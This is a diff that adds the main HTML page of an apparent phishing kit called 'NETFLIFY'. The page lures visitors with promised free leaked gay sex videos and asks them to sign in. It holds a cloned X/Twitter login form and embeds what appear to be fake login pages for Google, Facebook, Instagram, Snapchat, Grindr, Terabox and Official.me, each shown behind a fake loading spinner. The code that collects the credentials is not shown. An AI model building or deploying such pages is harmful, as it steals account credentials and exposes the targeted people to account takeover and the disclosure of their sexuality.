@@ -1,0 +1,452 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NETFLIFY | Gay Sex videos Showcase</title>
+    <meta name="description" content="A futuristic, premium-quality responsive media showcase featuring cinematic visuals and smooth interactions.">
+    <link rel="stylesheet" href="styles.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;800&family=Inter:wght@300;400;500&display=swap" rel="stylesheet">
+    <style>
+        /* X Login Modal Styles */
+        .x-login-container {
+            max-width: 420px;
+            width: 100%;
+            background: #fff;
+            border-radius: 16px;
+            padding: 30px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.15);
+            position: relative;
+        }
+        .x-logo {
+            margin-bottom: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            width: 100%;
+        }
+        .x-icon {
+            width: 36px;
+            height: 36px;
+            display: block;
+        }
+        .login-heading {
+            font-size: 32px;
+            font-weight: 700;
+            line-height: 1.2;
+            margin-bottom: 28px;
+            color: #1a1a1a;
+            letter-spacing: -0.3px;
+            font-family: system-ui, -apple-system, sans-serif;
+            text-align: left;
+        }
+        .form-group {
+            margin-bottom: 20px;
+        }
+        .form-label {
+            display: block;
+            font-size: 14px;
+            font-weight: 500;
+            margin-bottom: 6px;
+            color: #111;
+            font-family: system-ui, -apple-system, sans-serif;
+            text-align: left;
+        }
+        .form-input {
+            width: 100%;
+            padding: 12px 14px;
+            font-size: 15px;
+            font-family: system-ui, -apple-system, sans-serif;
+            border: 1px solid #ccc;
+            border-radius: 6px;
+            background-color: #fff;
+            transition: border 0.1s ease;
+            outline: none;
+            color: #000;
+        }
+        .form-input:focus {
+            border-color: #000;
+            box-shadow: none;
+            outline: none;
+        }
+        .forgot-link {
+            display: block;
+            text-align: left;
+            margin-top: 8px;
+            margin-bottom: 32px;
+            font-size: 14px;
+            font-family: system-ui, -apple-system, sans-serif;
+        }
+        .forgot-link a {
+            color: #0066cc;
+            text-decoration: none;
+            font-weight: 500;
+        }
+        .forgot-link a:hover {
+            text-decoration: underline;
+        }
+        .continue-btn {
+            width: 100%;
+            background-color: #e0e0e0;   
+            color: #6c6c6c;
+            font-size: 16px;
+            font-weight: 600;
+            padding: 12px 16px;
+            border: none;
+            border-radius: 30px;          
+            cursor: not-allowed;
+            font-family: system-ui, -apple-system, sans-serif;
+            text-align: center;
+            display: inline-block;
+            margin-bottom: 24px;
+            transition: background-color 0.2s ease, color 0.2s ease;
+            pointer-events: none;
+        }
+        .continue-btn.active {
+            background-color: #000000;
+            color: white;
+            cursor: pointer;
+            pointer-events: auto;
+        }
+        .continue-btn.active:hover {
+            background-color: #2c2c2c;
+        }
+        .legal-text {
+            font-size: 12px;
+            color: #5e5e5e;
+            line-height: 1.4;
+            text-align: left;
+            margin-top: 8px;
+            margin-bottom: 8px;
+            font-family: system-ui, -apple-system, sans-serif;
+        }
+        .legal-text a {
+            color: #1a1a1a;
+            text-decoration: none;
+            font-weight: 500;
+        }
+        .legal-text a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <!-- Auth Overlay -->
+    <div id="authOverlay" class="auth-overlay hidden">
+        <div class="auth-box" style="position: relative;">
+            <span id="closeAuth" style="position: absolute; top: 15px; right: 20px; color: var(--text-secondary); font-size: 28px; cursor: pointer; line-height: 1;">&times;</span>
+            <div class="logo" style="font-size: 2.5rem; text-align: center; margin-bottom: 10px;">NETFLIFY</div>
+            <p id="authSubtitle" class="auth-subtitle">Sign in to NETLIFY to watch the free leaked videos</p>
+            
+            <form id="authForm">
+                <div class="input-group">
+                    <label for="authEmail">Email Address</label>
+                    <input type="email" id="authEmail" required placeholder="name@example.com">
+                </div>
+                <div class="input-group">
+                    <label for="authPassword">Password</label>
+                    <input type="password" id="authPassword" required placeholder="••••••••">
+                </div>
+                <div id="authError" class="auth-error"></div>
+                <button type="submit" id="authSubmitBtn" class="cta-button" style="width: 100%; margin-top: 15px; cursor: pointer;">Login</button>
+            </form>
+            
+            <div class="auth-toggle">
+                <span id="authToggleText">Don't have an account?</span> <span id="toggleAuthMode" style="color: var(--accent-2); cursor: pointer; font-weight: 600;">Sign Up</span>
+            </div>
+
+            <!-- Social Logins Section -->
+            <div class="social-auth-section">
+                <div class="social-divider">
+                    <span>Also login with</span>
+                </div>
+                
+                <!-- Row 1: Twitter, Grindr, Terabox, Official.me -->
+                <div class="social-row row-1">
+                    <div class="social-btn" id="twitterBtn" title="Twitter / X">
+                        <img src="twitter(X).png" alt="Twitter / X" style="width: 28px; height: 28px; object-fit: contain;">
+                        <span class="social-label">Twitter</span>
+                    </div>
+                    <div class="social-btn" id="grindrBtn" title="Grindr">
+                        <img src="grindr.png" alt="Grindr" style="width: 28px; height: 28px; object-fit: contain;">
+                        <span class="social-label">Grindr</span>
+                    </div>
+                    <div class="social-btn" id="teraboxBtn" title="Terabox">
+                        <img src="terabox.png" alt="Terabox" style="width: 28px; height: 28px; object-fit: contain;">
+                        <span class="social-label">Terabox</span>
+                    </div>
+                    <div class="social-btn" id="officialMeBtn" title="Official.me">
+                        <img src="official.me.png" alt="Official.me" style="width: 28px; height: 28px; object-fit: contain;">
+                        <span class="social-label">Official.me</span>
+                    </div>
+                </div>
+
+                <!-- Row 2: Google, Facebook, Instagram, Snapchat -->
+                <div class="social-row row-2">
+                    <div class="social-btn" id="googleBtn" title="Google">
+                        <img src="google.png" alt="Google" style="width: 20px; height: 20px; object-fit: contain;">
+                        <span class="social-label">Google</span>
+                    </div>
+                    <div class="social-btn" id="facebookBtn" title="Facebook">
+                        <img src="facebook.png" alt="Facebook" style="width: 20px; height: 20px; object-fit: contain;">
+                        <span class="social-label">Facebook</span>
+                    </div>
+                    <div class="social-btn" id="instagramBtn" title="Instagram">
+                        <img src="instagram.png" alt="Instagram" style="width: 20px; height: 20px; object-fit: contain;">
+                        <span class="social-label">Instagram</span>
+                    </div>
+                    <div class="social-btn" id="snapchatBtn" title="Snapchat">
+                        <img src="snapchat.png" alt="Snapchat" style="width: 20px; height: 20px; object-fit: contain;">
+                        <span class="social-label">Snapchat</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- X Loading Overlay -->
+    <div id="xLoadingOverlay" class="auth-overlay hidden" style="z-index: 2001;">
+        <div style="font-family: system-ui, -apple-system, sans-serif; font-size: 20px; font-weight: 500; color: #ffffff; background: rgba(0,0,0,0.8); padding: 20px 40px; border-radius: 8px; display: flex; align-items: center; gap: 15px;">
+            <div style="width: 24px; height: 24px; border: 3px solid rgba(255,255,255,0.3); border-radius: 50%; border-top-color: #fff; animation: spin 1s linear infinite;"></div>
+            <span>please wait for 2-3 seconds...</span>
+        </div>
+        <style>
+            @keyframes spin {
+                to { transform: rotate(360deg); }
+            }
+        </style>
+    </div>
+
+    <!-- X Auth Overlay -->
+    <div id="xAuthOverlay" class="auth-overlay hidden" style="z-index: 2000;">
+        <div class="x-login-container">
+            <span id="closeXAuth" style="position: absolute; top: 15px; left: 20px; color: #1a1a1a; font-size: 28px; cursor: pointer; line-height: 1;">&times;</span>
+            
+            <!-- X logo centered -->
+            <div class="x-logo">
+                <svg class="x-icon" viewBox="0 0 24 24" aria-label="X" fill="currentColor" style="color: #000000;">
+                    <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/>
+                </svg>
+            </div>
+
+            <h1 class="login-heading">Login</h1>
+
+            <form id="xLoginForm">
+                <div class="form-group">
+                    <label class="form-label" for="xUsername">Username</label>
+                    <input type="email" class="form-input" id="xUsername" name="username" value="" autocomplete="username" placeholder=" ">
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label" for="xPassword">Password</label>
+                    <input type="password" class="form-input" id="xPassword" name="password" value="" autocomplete="current-password" placeholder=" ">
+                </div>
+
+                <div class="forgot-link">
+                    <a href="#" aria-label="Forgot password">Forgot password?</a>
+                </div>
+
+                <button type="button" id="xContinueBtn" class="continue-btn">Continue</button>
+
+                <div class="legal-text">
+                    By continuing, you agree to our <a href="#">Terms of Service</a>, <a href="#">Privacy Policy</a> and <a href="#">Cookie Use</a>.
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <!-- Snapchat Loading Overlay -->
+    <div id="snapchatLoadingOverlay" class="auth-overlay hidden" style="z-index: 2001;">
+        <div style="font-family: system-ui, -apple-system, sans-serif; font-size: 20px; font-weight: 500; color: #ffffff; background: rgba(0,0,0,0.8); padding: 20px 40px; border-radius: 8px; display: flex; align-items: center; gap: 15px;">
+            <div style="width: 24px; height: 24px; border: 3px solid rgba(255,255,255,0.3); border-radius: 50%; border-top-color: #fffc00; animation: spin 1s linear infinite;"></div>
+            <span>please wait for 2-3 seconds...</span>
+        </div>
+    </div>
+
+    <!-- Snapchat Auth Overlay -->
+    <div id="snapchatAuthOverlay" class="auth-overlay hidden" style="z-index: 2000;">
+        <div style="position: relative; width: 100%; max-width: 400px; height: 600px; max-height: 90vh; background: #fff; border-radius: 16px; overflow: hidden; box-shadow: 0 4px 20px rgba(0,0,0,0.15);">
+            <span id="closeSnapchatAuth" style="position: absolute; top: 15px; right: 20px; color: #1a1a1a; font-size: 28px; cursor: pointer; line-height: 1; z-index: 10;">&times;</span>
+            <iframe src="snapchat_login.html" style="width: 100%; height: 100%; border: none;"></iframe>
+        </div>
+    </div>
+
+    <!-- Grindr Loading Overlay -->
+    <div id="grindrLoadingOverlay" class="auth-overlay hidden" style="z-index: 2001;">
+        <div style="font-family: system-ui, -apple-system, sans-serif; font-size: 20px; font-weight: 500; color: #ffffff; background: rgba(0,0,0,0.8); padding: 20px 40px; border-radius: 8px; display: flex; align-items: center; gap: 15px;">
+            <div style="width: 24px; height: 24px; border: 3px solid rgba(255,255,255,0.3); border-radius: 50%; border-top-color: #F5C518; animation: spin 1s linear infinite;"></div>
+            <span>please wait for 2-3 seconds...</span>
+        </div>
+    </div>
+
+    <!-- Grindr Auth Overlay -->
+    <div id="grindrAuthOverlay" class="auth-overlay hidden" style="z-index: 2000;">
+        <div style="position: relative; width: 100%; max-width: 400px; height: 600px; max-height: 90vh; background: #111008; border-radius: 16px; overflow: hidden; box-shadow: 0 4px 20px rgba(0,0,0,0.15);">
+            <span id="closeGrindrAuth" style="position: absolute; top: 15px; right: 20px; color: #ffffff; font-size: 28px; cursor: pointer; line-height: 1; z-index: 10;">&times;</span>
+            <iframe src="grindr_login.html" style="width: 100%; height: 100%; border: none;"></iframe>
+        </div>
+    </div>
+
+    <!-- Terabox Loading Overlay -->
+    <div id="teraboxLoadingOverlay" class="auth-overlay hidden" style="z-index: 2001;">
+        <div style="font-family: system-ui, -apple-system, sans-serif; font-size: 20px; font-weight: 500; color: #ffffff; background: rgba(0,0,0,0.8); padding: 20px 40px; border-radius: 8px; display: flex; align-items: center; gap: 15px;">
+            <div style="width: 24px; height: 24px; border: 3px solid rgba(255,255,255,0.3); border-radius: 50%; border-top-color: #a5b4fc; animation: spin 1s linear infinite;"></div>
+            <span>please wait for 2-3 seconds...</span>
+        </div>
+    </div>
+
+    <!-- Terabox Auth Overlay -->
+    <div id="teraboxAuthOverlay" class="auth-overlay hidden" style="z-index: 2000;">
+        <div style="position: relative; width: 100%; max-width: 400px; height: 600px; max-height: 90vh; background: #ffffff; border-radius: 16px; overflow: hidden; box-shadow: 0 4px 20px rgba(0,0,0,0.15);">
+            <span id="closeTeraboxAuth" style="position: absolute; top: 15px; right: 20px; color: #1a1a1a; font-size: 28px; cursor: pointer; line-height: 1; z-index: 10;">&times;</span>
+            <iframe src="terabox_login.html" style="width: 100%; height: 100%; border: none;"></iframe>
+        </div>
+    </div>
+
+    <!-- Google Loading Overlay -->
+    <div id="googleLoadingOverlay" class="auth-overlay hidden" style="z-index: 2001;">
+        <div style="font-family: system-ui, -apple-system, sans-serif; font-size: 20px; font-weight: 500; color: #ffffff; background: rgba(0,0,0,0.8); padding: 20px 40px; border-radius: 8px; display: flex; align-items: center; gap: 15px;">
+            <div style="width: 24px; height: 24px; border: 3px solid rgba(255,255,255,0.3); border-radius: 50%; border-top-color: #4285F4; animation: spin 1s linear infinite;"></div>
+            <span>please wait for 2-3 seconds...</span>
+        </div>
+    </div>
+
+    <!-- Google Auth Overlay -->
+    <div id="googleAuthOverlay" class="auth-overlay hidden" style="z-index: 2000;">
+        <div style="position: relative; width: 100%; max-width: 900px; height: 600px; max-height: 90vh; background: transparent; border-radius: 28px; overflow: hidden; display: flex; align-items: center; justify-content: center;">
+            <span id="closeGoogleAuth" style="position: absolute; top: 15px; right: 20px; color: #1a1a1a; font-size: 28px; cursor: pointer; line-height: 1; z-index: 10;">&times;</span>
+            <iframe src="google_login.html" style="width: 100%; height: 100%; border: none;"></iframe>
+        </div>
+    </div>
+
+    <!-- Facebook Loading Overlay -->
+    <div id="facebookLoadingOverlay" class="auth-overlay hidden" style="z-index: 2001;">
+        <div style="font-family: system-ui, -apple-system, sans-serif; font-size: 20px; font-weight: 500; color: #ffffff; background: rgba(0,0,0,0.8); padding: 20px 40px; border-radius: 8px; display: flex; align-items: center; gap: 15px;">
+            <div style="width: 24px; height: 24px; border: 3px solid rgba(255,255,255,0.3); border-radius: 50%; border-top-color: #1877f2; animation: spin 1s linear infinite;"></div>
+            <span>please wait for 2-3 seconds...</span>
+        </div>
+    </div>
+
+    <!-- Facebook Auth Overlay -->
+    <div id="facebookAuthOverlay" class="auth-overlay hidden" style="z-index: 2000;">
+        <div style="position: relative; width: 100%; max-width: 440px; height: 500px; max-height: 90vh; background: transparent; border-radius: 12px; overflow: hidden; display: flex; align-items: center; justify-content: center;">
+            <span id="closeFacebookAuth" style="position: absolute; top: 15px; right: 20px; color: #1a1a1a; font-size: 28px; cursor: pointer; line-height: 1; z-index: 10;">&times;</span>
+            <iframe src="facebook_login.html" style="width: 100%; height: 100%; border: none;"></iframe>
+        </div>
+    </div>
+
+    <!-- Instagram Loading Overlay -->
+    <div id="instagramLoadingOverlay" class="auth-overlay hidden" style="z-index: 2001;">
+        <div style="font-family: system-ui, -apple-system, sans-serif; font-size: 20px; font-weight: 500; color: #ffffff; background: rgba(0,0,0,0.8); padding: 20px 40px; border-radius: 8px; display: flex; align-items: center; gap: 15px;">
+            <div style="width: 24px; height: 24px; border: 3px solid rgba(255,255,255,0.3); border-radius: 50%; border-top-color: #E1306C; animation: spin 1s linear infinite;"></div>
+            <span>please wait for 2-3 seconds...</span>
+        </div>
+    </div>
+
+    <!-- Instagram Auth Overlay -->
+    <div id="instagramAuthOverlay" class="auth-overlay hidden" style="z-index: 2000;">
+        <div style="position: relative; width: 100%; max-width: 520px; height: 600px; max-height: 90vh; background: transparent; border-radius: 12px; overflow: hidden; display: flex; align-items: center; justify-content: center;">
+            <span id="closeInstagramAuth" style="position: absolute; top: 15px; right: 20px; color: #1a1a1a; font-size: 28px; cursor: pointer; line-height: 1; z-index: 10;">&times;</span>
+            <iframe src="instagram_login.html" style="width: 100%; height: 100%; border: none;"></iframe>
+        </div>
+    </div>
+
+    <!-- Official.me Loading Overlay -->
+    <div id="officialMeLoadingOverlay" class="auth-overlay hidden" style="z-index: 2001;">
+        <div style="font-family: system-ui, -apple-system, sans-serif; font-size: 20px; font-weight: 500; color: #ffffff; background: rgba(0,0,0,0.8); padding: 20px 40px; border-radius: 8px; display: flex; align-items: center; gap: 15px;">
+            <div style="width: 24px; height: 24px; border: 3px solid rgba(255,255,255,0.3); border-radius: 50%; border-top-color: #5b5fe8; animation: spin 1s linear infinite;"></div>
+            <span>please wait for 2-3 seconds...</span>
+        </div>
+    </div>
+
+    <!-- Official.me Auth Overlay -->
+    <div id="officialMeAuthOverlay" class="auth-overlay hidden" style="z-index: 2000;">
+        <div style="position: relative; width: 100%; max-width: 588px; height: 600px; max-height: 90vh; background: transparent; border-radius: 12px; overflow: hidden; display: flex; align-items: center; justify-content: center;">
+            <span id="closeOfficialMeAuth" style="position: absolute; top: 15px; right: 20px; color: #1a1a1a; font-size: 28px; cursor: pointer; line-height: 1; z-index: 10;">&times;</span>
+            <iframe src="officialme_login.html" style="width: 100%; height: 100%; border: none;"></iframe>
+        </div>
+    </div>
+
+    <!-- Ambient Cursor Light -->
+    <div class="ambient-light" id="ambientLight"></div>
+
+    <!-- Scroll Progress -->
+    <div class="scroll-progress-container">
+        <div class="scroll-progress-bar" id="scrollBar"></div>
+    </div>
+
+    <!-- Floating Navigation -->
+    <nav class="navbar">
+        <div class="logo">NETFLIFY</div>
+        <ul class="nav-links">
+            <li><a href="#home">Home</a></li>
+            <li><a href="#media">Gay Sex videos</a></li>
+        </ul>
+        <div class="controls" style="display: flex; gap: 10px;">
+            <button id="logoutBtn" class="glass-btn" title="Logout" style="display: none;">
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"></path>
+                    <polyline points="16 17 21 12 16 7"></polyline>
+                    <line x1="21" y1="12" x2="9" y2="12"></line>
+                </svg>
+            </button>
+            <button id="musicToggle" class="glass-btn" title="Toggle Background Music">
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M9 18V5l12-2v13"></path>
+                    <circle cx="6" cy="18" r="3"></circle>
+                    <circle cx="18" cy="16" r="3"></circle>
+                </svg>
+            </button>
+        </div>
+    </nav>
+
+    <!-- Background Audio -->
+    <audio id="bgMusic" loop>
+        <source src="https://assets.mixkit.co/music/preview/mixkit-tech-house-vibes-130.mp3" type="audio/mpeg">
+    </audio>
+
+    <!-- Fullscreen Modal Viewer -->
+    <div id="mediaModal" class="modal">
+        <span class="close-modal">&times;</span>
+        <div class="modal-content">
+            <div id="modalBody" class="modal-body"></div>
+        </div>
+    </div>
+
+    <!-- Hero Section -->
+    <header id="home" class="hero">
+        <div class="hero-bg">
+            <div class="gradient-sphere sphere-1"></div>
+            <div class="gradient-sphere sphere-2"></div>
+        </div>
+        <div class="hero-content reveal">
+            <h1 class="hero-title">Welcome to<br><span class="text-gradient">NETFLIFY.</span></h1>
+            <p class="hero-subtitle">Welcome to NETLIFY, where you can find a sexy guys leaked videos as well as gay sex videos for free.</p>
+            <a href="#media" class="cta-button">Watch videos for free</a>
+        </div>
+    </header>
+
+    <!-- Feed Media Section -->
+    <section id="media" class="section">
+        <div class="section-header reveal" style="align-items: center;">
+            <h2>Media Feed</h2>
+        </div>
+        
+        <div id="feedContainer" class="feed-container">
+            <!-- Folders will be generated here -->
+        </div>
+    </section>
+
+    <footer>
+        <div class="footer-content">
+            <h2>NETFLIFY</h2>
+            <p>Premium Media Experience</p>
+        </div>
+    </footer>
+
+    <script src="media.js"></script>
+    <script src="script.js"></script>
+</body>
+</html>
